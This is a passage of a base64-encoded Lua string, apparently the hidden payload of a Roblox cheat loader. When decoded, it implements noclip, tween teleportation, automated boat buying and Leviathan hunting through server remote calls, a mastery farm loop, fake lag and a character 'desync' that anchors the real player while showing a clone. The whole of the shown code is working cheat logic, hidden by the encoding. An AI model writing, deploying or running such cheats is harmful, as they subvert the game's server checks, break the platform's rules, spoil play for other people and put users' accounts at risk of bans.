VzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgdGhlbiB2LkNhbkNvbGxpZGUgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgaWYgd2FzQXV0b1JhaWQgdGhlbgogICAgICAgICAgICAgICAgICAgIHdhc0F1dG9SYWlkID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBMYXN0UmFpZFRhcmdldFRpbWUgPSBvcy5jbG9jaygpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gUmVzZXQgQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LlNpemUgPSBWZWN0b3IzLm5ldygyLCAyLCAxKQogICAgICAgICAgICAgICAgICAgICAgICByb290UGFydC5UcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQ6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5HZXR0aW5nVXApCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIExhc3RSYWlkVGFyZ2V0VGltZSA9IG9zLmNsb2NrKCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgLS0gU0VBIEVWRU5UIExPR0lDIChMZXZpYXRoYW4gJiBCb2F0KQogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgVGlraU91dHBvc3RQb3MgPSBWZWN0b3IzLm5ldygtMTY5MTMuNjcsIDkuNDAsIDUxMC4zMykKICAgICAgICBsb2NhbCBab25lNlBvc2l0aW9uID0gVmVjdG9yMy5uZXcoLTQwMDAwLCAxMCwgLTUwMDApCiAgICAgICAgCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gVHdlZW5Ubyh0YXJnZXRQb3MpCiAgICAgICAgICAgIGlmIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgYW5kIHJvb3RQYXJ0LlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBkaXN0ID0gKHJvb3RQYXJ0LlBvc2l0aW9uIC0gdGFyZ2V0UG9zKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgIGlmIGRpc3QgPCA1MCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgc3BlZWQgPSAzNTAKICAgICAgICAgICAgICAgIGxvY2FsIGluZm8gPSBUd2VlbkluZm8ubmV3KGRpc3QgLyBzcGVlZCwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIpCiAgICAgICAgICAgICAgICBsb2NhbCB0d2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUocm9vdFBhcnQsIGluZm8sIHtDRnJhbWUgPSBDRnJhbWUubmV3KHRhcmdldFBvcyl9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBjb25uID0gUnVuU2VydmljZS5TdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgdGhlbiB2LkNhbkNvbGxpZGUgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHR3ZWVuOlBsYXkoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBXYWl0IGZvciBjb21wbGV0aW9uIG9yIGNhbmNlbGxhdGlvbgogICAgICAgICAgICAgICAgd2hpbGUgdHdlZW4uUGxheWJhY2tTdGF0ZSA9PSBFbnVtLlBsYXliYWNrU3RhdGUuUGxheWluZyBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuSXNSdW5uaW5nIG9yIChub3QgQ29uZmlnLkF1dG9GaW5kTGV2aWF0aGFuIGFuZCBub3QgQ29uZmlnLkF1dG9CdXlCb2F0KSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHR3ZWVuOkNhbmNlbCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGNoYXJhY3RlciBvciBub3Qgcm9vdFBhcnQgb3Igbm90IHJvb3RQYXJ0LlBhcmVudCBvciAoaHVtYW5vaWQgYW5kIGh1bWFub2lkLkhlYWx0aCA8PSAwKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHR3ZWVuOkNhbmNlbCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBjb25uIHRoZW4gY29ubjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIGZ1bmN0aW9uIEJ1eUFuZFNpdCgpCiAgICAgICAgICAgIGlmIG5vdCByb290UGFydCBvciBub3QgaHVtYW5vaWQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIC0tIDEuIEdvIHRvIFRpa2kKICAgICAgICAgICAgaWYgKHJvb3RQYXJ0LlBvc2l0aW9uIC0gVGlraU91dHBvc3RQb3MpLk1hZ25pdHVkZSA+IDUwMCB0aGVuCiAgICAgICAgICAgICAgICBUd2VlblRvKFRpa2lPdXRwb3N0UG9zKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhUaWtpT3V0cG9zdFBvcykKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIDIuIEJ1eQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKCJCdXlCb2F0IiwgQ29uZmlnLlNlbGVjdGVkQm9hdCkKICAgICAgICAgICAgdGFzay53YWl0KDEuNSkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIDMuIFNpdAogICAgICAgICAgICBsb2NhbCBzZWF0Rm91bmQgPSBuaWwKICAgICAgICAgICAgbG9jYWwgc2VhcmNoTGlzdCA9IHdvcmtzcGFjZTpHZXRDaGlsZHJlbigpCiAgICAgICAgICAgIGlmIHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiQm9hdHMiKSB0aGVuIHNlYXJjaExpc3QgPSB3b3Jrc3BhY2UuQm9hdHM6R2V0Q2hpbGRyZW4oKSBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKHNlYXJjaExpc3QpIGRvCiAgICAgICAgICAgICAgICBpZiAodi5OYW1lOmZpbmQoIkJvYXQiKSBvciB2Lk5hbWUgPT0gQ29uZmlnLlNlbGVjdGVkQm9hdCkgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHNlYXQgPSB2OkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlU2VhdCIpIG9yIHY6RmluZEZpcnN0Q2hpbGQoIkRyaXZlclNlYXQiKSBvciB2OkZpbmRGaXJzdENoaWxkKCJTZWF0IikKICAgICAgICAgICAgICAgICAgICBpZiBzZWF0IGFuZCAoc2VhdC5Qb3NpdGlvbiAtIHJvb3RQYXJ0LlBvc2l0aW9uKS5NYWduaXR1ZGUgPCAyMDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBzZWF0Rm91bmQgPSBzZWF0CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBzZWF0Rm91bmQgYW5kIHJvb3RQYXJ0IGFuZCBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSBzZWF0Rm91bmQuQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCwgMywgMCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBzZWF0Rm91bmQ6U2l0KGh1bWFub2lkKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAtLSBBVVRPIEJVWSBCT0FUIE9OTFkKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5BdXRvQnV5Qm9hdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCByb290UGFydCBhbmQgaHVtYW5vaWQgYW5kIGh1bWFub2lkLkhlYWx0aCA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgaHVtYW5vaWQuU2VhdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQnV5QW5kU2l0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkF1dG9CdXlCb2F0ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJBdXRvQnV5Qm9hdCJdIHRoZW4gVG9nZ2xlQnV0dG9uc1siQXV0b0J1eUJvYXQiXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gQVVUTyBGSU5EIExFVklBVEhBTiAoRlVMTCBTRVFVRU5DRSkKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5BdXRvRmluZExldmlhdGhhbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCByb290UGFydCBhbmQgaHVtYW5vaWQgYW5kIGh1bWFub2lkLkhlYWx0aCA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAtLSAxLiBCdXkvU2l0IGlmIG5vdCBzZWF0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGh1bWFub2lkLlNlYXRQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJ1eUFuZFNpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLS0gMi4gRHJpdmUgdG8gWm9uZSA2CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGh1bWFub2lkLlNlYXRQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZlaGljbGUgPSBodW1hbm9pZC5TZWF0UGFydC5QYXJlbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHByaW1hcnkgPSB2ZWhpY2xlLlByaW1hcnlQYXJ0IG9yIGh1bWFub2lkLlNlYXRQYXJ0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAocHJpbWFyeS5Qb3NpdGlvbiAtIFpvbmU2UG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGlzdCA+IDUwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaW5mbyA9IFR3ZWVuSW5mby5uZXcoZGlzdCAvIDM1MCwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdHdlZW4gPSBUd2VlblNlcnZpY2U6Q3JlYXRlKHByaW1hcnksIGluZm8sIHtDRnJhbWUgPSBDRnJhbWUubmV3KFpvbmU2UG9zaXRpb24pfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBub2NsaXBDb25uID0gUnVuU2VydmljZS5TdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyh2ZWhpY2xlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiQmFzZVBhcnQiKSB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuQ2FuQ29sbGlkZSA9IGZhbHNlIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuVHJhbnNwYXJlbmN5ID0gMC41CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR3ZWVuOlBsYXkoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIHR3ZWVuLlBsYXliYWNrU3RhdGUgPT0gRW51bS5QbGF5YmFja1N0YXRlLlBsYXlpbmcgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5BdXRvRmluZExldmlhdGhhbiB0aGVuIHR3ZWVuOkNhbmNlbCgpIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB3b3Jrc3BhY2UuRW5lbWllczpGaW5kRmlyc3RDaGlsZCgiRnJvemVuIFdhdGNoZXIiKSB0aGVuIHR3ZWVuOkNhbmNlbCgpIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgaHVtYW5vaWQuU2VhdFBhcnQgdGhlbiB0d2VlbjpDYW5jZWwoKSBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub2NsaXBDb25uIHRoZW4gbm9jbGlwQ29ubjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbWFyeS5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLS0gMy4gV2FpdC9HbyB0byBGcm96ZW4gV2F0Y2hlcgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB3YXRjaGVyID0gd29ya3NwYWNlLkVuZW1pZXM6RmluZEZpcnN0Q2hpbGQoIkZyb3plbiBXYXRjaGVyIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgd2F0Y2hlciBhbmQgd2F0Y2hlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR3ZWVuVG8od2F0Y2hlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMCwgMzAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIDQuIFNwYW0gR2F0ZQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKCJGcm96ZW5EaW1lbnNpb24iKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIC0tIE1BU1RFUlkgRkFSTSBMT09QCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwb2ludHMgPSB7CiAgICAgICAgICAgIFZlY3RvcjMubmV3KDQ1LjU0LCA5OS4zNywgLTEyNjA1LjQyKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTExLjAyLCAxMDAuMjQsIC0xMjkzMy44OCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDcyNCwgOTQuNDYsIC0xMjYxNy41OCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMy44NSwgOTQuNjIsIC0xMjI2Mi4yMykKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gVHdlZW5Ubyh0YXJnZXRQb3MpCiAgICAgICAgICAgIGlmIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgYW5kIHJvb3RQYXJ0LlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBkaXN0ID0gKHJvb3RQYXJ0LlBvc2l0aW9uIC0gdGFyZ2V0UG9zKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgIGlmIGRpc3QgPCA1IHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBzcGVlZCA9IDMwMCAKICAgICAgICAgICAgICAgIGxvY2FsIGluZm8gPSBUd2VlbkluZm8ubmV3KGRpc3QgLyBzcGVlZCwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIpCiAgICAgICAgICAgICAgICBsb2NhbCB0d2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUocm9vdFBhcnQsIGluZm8sIHtDRnJhbWUgPSBDRnJhbWUubmV3KHRhcmdldFBvcyl9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBub2NsaXBDb25uID0gUnVuU2VydmljZS5TdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQog" .. "ICAgICAgICAgICAgICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgdGhlbiB2LkNhbkNvbGxpZGUgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHR3ZWVuOlBsYXkoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSB0d2Vlbi5QbGF5YmFja1N0YXRlID09IEVudW0uUGxheWJhY2tTdGF0ZS5QbGF5aW5nIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Jc1J1bm5pbmcgb3Igbm90IENvbmZpZy5NYXN0ZXJ5RmFybSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHR3ZWVuOkNhbmNlbCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGNoYXJhY3RlciBvciBub3Qgcm9vdFBhcnQgb3Igbm90IHJvb3RQYXJ0LlBhcmVudCBvciAoaHVtYW5vaWQgYW5kIGh1bWFub2lkLkhlYWx0aCA8PSAwKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHR3ZWVuOkNhbmNlbCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub2NsaXBDb25uIHRoZW4gbm9jbGlwQ29ubjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgICAgICAgICBpZiByb290UGFydCB0aGVuIHJvb3RQYXJ0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwwLDApIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBpZiBDb25maWcuTWFzdGVyeUZhcm0gdGhlbgogICAgICAgICAgICAgICAgRXF1aXBTZWxlY3RlZFdlYXBvbigpCiAgICAgICAgICAgICAgICBmb3IgXywgcG9pbnQgaW4gaXBhaXJzKHBvaW50cykgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLk1hc3RlcnlGYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgVHdlZW5Ubyhwb2ludCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuTWFzdGVyeUZhcm0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdGFydFdhaXQgPSB0aWNrKCkKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgdGljaygpIC0gc3RhcnRXYWl0IDwgNCBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5NYXN0ZXJ5RmFybSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290UGFydC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KHBvaW50KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICAtLSBGQUtFIExBRyBMT09QCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgIGlmIENvbmZpZy5GYWtlTGFnIGFuZCBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4gcm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICAtLSBERVNZTkMgTE9HSUMgLSBDbG9uZSBpbW1vYmlsZSB2aXNpYmxlIGF1eCBhdXRyZXMKICAgIGxvY2FsIGRlc3luY0Nsb25lID0gbmlsCiAgICBsb2NhbCBpc0Rlc3luY0VuYWJsZWQgPSBmYWxzZQogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBlbmFibGVEZXN5bmMoKQogICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgb3Igbm90IHJvb3RQYXJ0IHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGlzRGVzeW5jRW5hYmxlZCA9IHRydWUKICAgICAgICAKICAgICAgICAtLSBDcsOpZXIgdW4gY2xvbmUgZHUgY2hhcmFjdGVyCiAgICAgICAgaWYgbm90IGRlc3luY0Nsb25lIHRoZW4KICAgICAgICAgICAgZGVzeW5jQ2xvbmUgPSBjaGFyYWN0ZXI6Q2xvbmUoKQogICAgICAgICAgICBkZXN5bmNDbG9uZS5OYW1lID0gY2hhcmFjdGVyLk5hbWUKICAgICAgICAgICAgZGVzeW5jQ2xvbmUuUGFyZW50ID0gV29ya3NwYWNlCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBEw6lzYWN0aXZlciBsZXMgc2NyaXB0cyBkdSBjbG9uZQogICAgICAgICAgICBmb3IgXywgc2NyaXB0IGluIHBhaXJzKGRlc3luY0Nsb25lOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBzY3JpcHQ6SXNBKCJMb2NhbFNjcmlwdCIpIG9yIHNjcmlwdDpJc0EoIlNjcmlwdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBzY3JpcHQ6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBEw6lzYWN0aXZlciBsJ2h1bWFub2lkIGR1IGNsb25lIChpbCBuZSBwZXV0IHBhcyBtb3VyaXIpCiAgICAgICAgICAgIGxvY2FsIGNsb25lSHVtID0gZGVzeW5jQ2xvbmU6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICAgICAgaWYgY2xvbmVIdW0gdGhlbgogICAgICAgICAgICAgICAgY2xvbmVIdW0uTWF4SGVhbHRoID0gbWF0aC5odWdlCiAgICAgICAgICAgICAgICBjbG9uZUh1bS5IZWFsdGggPSBtYXRoLmh1Z2UKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBHZWxlciBsZSBjbG9uZSDDoCBsYSBwb3NpdGlvbiBhY3R1ZWxsZQogICAgICAgICAgICBpZiBkZXN5bmNDbG9uZTpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGNsb25lUm9vdCA9IGRlc3luY0Nsb25lLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgICAgIGNsb25lUm9vdC5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgICAgIGNsb25lUm9vdC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgIGNsb25lUm9vdC5DRnJhbWUgPSByb290UGFydC5DRnJhbWUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gR2VsZXIgbGUgdnJhaSBjaGFyYWN0ZXIgYXZlYyBBbmNob3JlZCAobmUgYm91Z2UgcGFzIGPDtHTDqSBzZXJ2ZXVyKQogICAgICAgIHJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIAogICAgICAgIC0tIFJlbmRyZSBsZSB2cmFpIGNoYXJhY3RlciBpbnZpc2libGUKICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhja